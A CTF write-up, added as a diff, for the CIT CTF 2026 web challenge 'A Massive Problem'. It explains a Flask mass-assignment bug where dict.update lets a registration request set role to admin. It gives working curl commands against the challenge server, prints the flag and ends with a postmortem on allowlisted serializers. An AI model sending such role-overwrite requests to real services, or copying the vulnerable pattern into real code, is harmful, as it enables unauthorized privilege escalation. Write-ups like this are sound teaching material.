@@ -1,0 +1,63 @@
+---
+title: "CIT CTF 2026 · A Massive Problem: mass assignment via dict.update"
+description: The challenge name spells it out. At register time, record.update(incoming) lets the role field in the request body overwrite the hard-coded default.
+pubDate: 2026-05-09
+tags: [CTF, cit-ctf-2026, web, flask]
+series: CIT CTF 2026
+---
+
+> Improper Authorization has been fixed! I think we are ready for production!
+
+The challenge name *A **Mass**ive Problem* literally spells out **Mass Assignment**. The description says they fixed "improper authorization" — and the new bug is a different flavor of the same family. Standard CTF setup.
+
+## Where the bug lives
+
+In the attachment, `/api/register` in `app/app.py` looks like this:
+
+```python
+record = {
+    'username': username,
+    'password': password,
+    'role': 'standard',
+    'full_name': full_name,
+    'title': title,
+    'team': team,
+}
+record.update(incoming)          # ← user-controlled JSON overwrites defaults
+if not record.get('username') or not record.get('password') or not record.get('role'):
+    return jsonify({'error': 'Unable to create account.'}), 400
+conn.execute(
+    'insert into users ... values (?, ?, ?, ?, ?, ?) '
+    'on conflict(username) do update set ...',
+    (record['username'], record['password'], record['role'], ...)
+)
+```
+
+Textbook mass assignment. `record` is initialized with `role='standard'`, then `record.update(incoming)` lets any field from the request body (including `role`) overwrite the default.
+
+## Exploit
+
+Register with `role=admin`, log in, hit `/admin` for the flag.
+
+```bash
+# 1. Register as admin
+curl -sS -c /tmp/amp.cookies -X POST http://23.179.17.92:5556/api/register \
+    -H 'Content-Type: application/json' \
+    -d '{"username":"pwnjack","password":"Aa1!aaaa","full_name":"x","title":"x","team":"x","role":"admin"}'
+
+# 2. Log in for the session cookie
+curl -sS -c /tmp/amp.cookies -b /tmp/amp.cookies -X POST http://23.179.17.92:5556/api/login \
+    -H 'Content-Type: application/json' \
+    -d '{"username":"pwnjack","password":"Aa1!aaaa"}'
+
+# 3. Pull /admin
+curl -sS -b /tmp/amp.cookies http://23.179.17.92:5556/admin | grep -oE 'CIT\{[^}]+\}'
+```
+
+`CIT{M@ss_@ssignm3nt_Pr1v3sc}`
+
+## Postmortem
+
+- "Update first, validate later" is the heart of this bug. Schema validation has to run *before* the `update` — better still, never deserialize a "whole record" from the request body at all.
+- Modern frameworks solve this with **allowlisted serializers**: Pydantic's `model_dump(include=...)`, Django `Form`s, Rails `strong_parameters`, Go's tagged struct mappers — all the same idea.
+- The SQL column order is pinned in the insert, which limits the blast radius to the three columns that are read back. If the code instead did something lazy like `INSERT ... SELECT * FROM (VALUES (record))`, even `created_at` would be overwritable.
